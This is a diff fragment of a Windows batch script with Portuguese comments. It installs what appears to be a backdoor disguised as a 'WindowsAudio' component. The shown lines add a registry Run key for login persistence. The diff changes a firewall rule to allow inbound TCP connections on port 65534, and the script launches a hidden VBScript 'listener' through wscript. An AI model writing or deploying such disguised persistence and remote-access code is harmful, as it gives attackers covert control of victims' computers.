@@ -37,8 +37,8 @@ echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"
 :: Registrar no Windows
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f > nul 2>&1
 
-:: Liberar a porta 65534 na saida
-netsh advfirewall firewall add rule name="Abrir Porta Saida 65534" dir=out action=allow protocol=TCP localport=65534
+:: Liberar a porta 65534 na entrada
+netsh advfirewall firewall add rule name="Abrir Porta Entrada 65534" dir=in action=allow protocol=TCP localport=65534
 
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
